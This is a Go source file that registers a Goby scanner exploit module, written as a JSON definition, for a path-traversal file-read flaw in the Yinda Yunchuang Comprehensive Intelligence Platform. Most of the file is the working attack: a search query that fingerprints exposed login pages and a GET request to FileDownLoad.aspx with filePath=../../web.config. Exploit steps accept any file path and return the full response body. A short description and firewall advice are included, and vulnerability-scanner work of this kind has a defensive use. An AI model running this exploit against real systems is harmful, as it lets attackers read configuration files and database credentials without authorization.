package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yinda Yunchuang Comprehensive Intelligence Platform /Module/FileManagement/FileDownLoad.aspx arbitrary file reading vulnerability",
    "Description": "<p>Yinda Yunchuang comprehensive smart platform is mainly aimed at education, government and other enterprises, assisting schools and enterprise parks to complete informatization and security service management.</p><p>An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
    "Product": "Yinda Yunchuang Comprehensive Intelligent Platform",
    "Homepage": "http://www.winstaryc.com/",
    "DisclosureDate": "2024-03-18",
    "PostTime": "2024-03-18",
    "Author": "xjy",
    "FofaQuery": "title=\"智慧综合管理平台登入\"",
    "GobyQuery": "title=\"智慧综合管理平台登入\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "../../web.config",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Module/FileManagement/FileDownLoad.aspx?filePath=../../web.config",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/Module/FileManagement/FileDownLoad.aspx?filePath=../../web.config",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/Module/FileManagement/FileDownLoad.aspx?filePath=../../web.config"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Module/FileManagement/FileDownLoad.aspx?filePath={{{filePath}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "HW-2023"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "银达云创综合智慧平台 /Module/FileManagement/FileDownLoad.aspx 任意文件读取漏洞",
            "Product": "银达云创综合智慧平台",
            "Description": "<p>银达云创综合智慧平台主要面向教育、政府等企业，协助学校和企业园区完成信息化和安全服务管理。<br></p><p>攻击者可通过攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Yinda Yunchuang Comprehensive Intelligence Platform /Module/FileManagement/FileDownLoad.aspx arbitrary file reading vulnerability",
            "Product": "Yinda Yunchuang Comprehensive Intelligent Platform",
            "Description": "<p>Yinda Yunchuang comprehensive smart platform is mainly aimed at education, government and other enterprises, assisting schools and enterprise parks to complete informatization and security service management.</p><p>An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
